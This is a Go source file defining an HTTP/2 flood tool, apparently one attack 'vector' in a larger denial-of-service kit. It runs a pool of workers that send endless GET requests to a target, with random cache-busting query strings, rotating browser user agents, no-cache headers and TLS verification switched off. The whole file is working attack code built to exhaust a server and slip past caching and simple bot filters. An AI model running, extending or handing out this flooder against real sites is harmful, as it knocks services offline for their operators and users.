package vectors

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

type HTTP2Flooder struct {
	target  string
	workers int
	sent    atomic.Uint64
	rng     *rand.Rand
}

func NewHTTP2Flooder(target string, workers int) *HTTP2Flooder {
	if workers <= 0 {
		workers = 64
	}
	return &HTTP2Flooder{
		target:  target,
		workers: workers,
		rng:     rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

func (h *HTTP2Flooder) randomUA() string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	}
	return uas[h.rng.Intn(len(uas))]
}

func (h *HTTP2Flooder) worker(stop <-chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()

	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2"},
		},
		DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
			d := &net.Dialer{Timeout: 5 * time.Second}
			return tls.DialWithDialer(d, network, addr, cfg)
		},
		DisableCompression: true,
	}
	cli := &http.Client{Transport: tr, Timeout: 8 * time.Second}

	for {
		select {
		case <-stop:
			return
		default:
		}
		req, _ := http.NewRequest("GET",
			fmt.Sprintf("%s/?_=%d", h.target, h.rng.Int63()), nil)
		req.Header.Set("User-Agent", h.randomUA())
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
		req.Header.Set("Pragma", "no-cache")

		resp, err := cli.Do(req)
		if err == nil {
			resp.Body.Close()
		}
		h.sent.Add(1)
	}
}

func (h *HTTP2Flooder) Run(stop <-chan struct{}) {
	var wg sync.WaitGroup
	for i := 0; i < h.workers; i++ {
		wg.Add(1)
		go h.worker(stop, &wg)
	}
	wg.Wait()
}

func (h *HTTP2Flooder) Sent() uint64 { return h.sent.Load() }
